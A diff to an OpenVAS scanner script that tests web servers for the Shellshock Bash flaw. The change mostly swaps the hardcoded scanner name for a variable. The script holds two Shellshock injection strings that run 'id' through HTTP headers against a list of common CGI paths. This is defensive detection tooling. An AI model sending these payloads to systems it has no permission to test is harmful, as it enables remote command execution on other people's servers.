@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_bash_shellshock_remote_cmd_exec_vuln.nasl 11108 2018-08-24 14:27:07Z mmartin $
+# $Id: gb_bash_shellshock_remote_cmd_exec_vuln.nasl 11222 2018-09-04 12:41:44Z cfischer $
 #
 # GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability
 #
@@ -28,12 +28,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804489");
-  script_version("$Revision: 11108 $");
+  script_version("$Revision: 11222 $");
   script_cve_id("CVE-2014-6271", "CVE-2014-6278");
   script_bugtraq_id(70103);
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-24 16:27:07 +0200 (Fri, 24 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-04 14:41:44 +0200 (Tue, 04 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-09-25 18:47:16 +0530 (Thu, 25 Sep 2014)");
   script_name("GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability");
   script_category(ACT_ATTACK);
@@ -81,7 +81,7 @@ if(description)
 }
 
 include("http_func.inc");
-
+include("misc_func.inc");
 
 cgis = make_list();
 cgis[i++] = '/';
@@ -150,21 +150,21 @@ cgis[i++] = '/cgi-bin/pathtest.pl';
 cgis[i++] = '/cgi-bin/contact.cgi';
 cgis[i++] = '/cgi-bin/uname.cgi';
 
-function _check( url, port, host )
+function _check( url, port, host, useragent, vt_string )
 {
   attacks = make_list(
-                      '() { OpenVAS:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;',
-                      '() { _; OpenVAS; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }'
+                      '() { ' + vt_string + ':; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;',
+                      '() { _; ' + vt_string + '; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }'
                      );
 
   foreach attack ( attacks )
   {
     foreach method ( make_list( "GET","POST") )
     {
-      foreach http_field (make_list("User-Agent:", "Referer:", "Cookie:", "OpenVAS:"))
+      foreach http_field (make_list("User-Agent:", "Referer:", "Cookie:", vt_string + ":"))
       {
-        sndReq = string( method," ", url, " HTTP/1.1\r\n",
-                        "Host: ", host, "\r\n",
+        sndReq = string( method, " ", url, " HTTP/1.1\r\n",
+                         "Host: ", host, "\r\n",
                          http_field, attack, "\r\n",
                          "Connection: close\r\n",
                          "Accept: */*\r\n\r\n");
@@ -210,13 +210,12 @@ function add_files( extensions )
       continue;
 
     if( ! known ) cgis[i++] = ext;
-
   }
 }
 
-port = get_http_port( default:80 );
-
 check_kb_cgis = script_get_preference( "Shellshock: Check CGIs in KB:" );
+
+port = get_http_port( default:80 );
 
 if( check_kb_cgis == "yes" )
 {
@@ -229,11 +228,13 @@ if( check_kb_cgis == "yes" )
   if( kb_cgis ) add_files( extensions:kb_cgis );
 }
 
+useragent = get_http_user_agent();
+vt_string = get_vt_string();
 host = http_host_name( port:port );
 
 foreach dir ( cgis )
 {
-  _check( url:dir, port:port, host:host );
+  _check( url:dir, port:port, host:host, useragent:useragent, vt_string:vt_string );
 }
 
 exit( 99 );
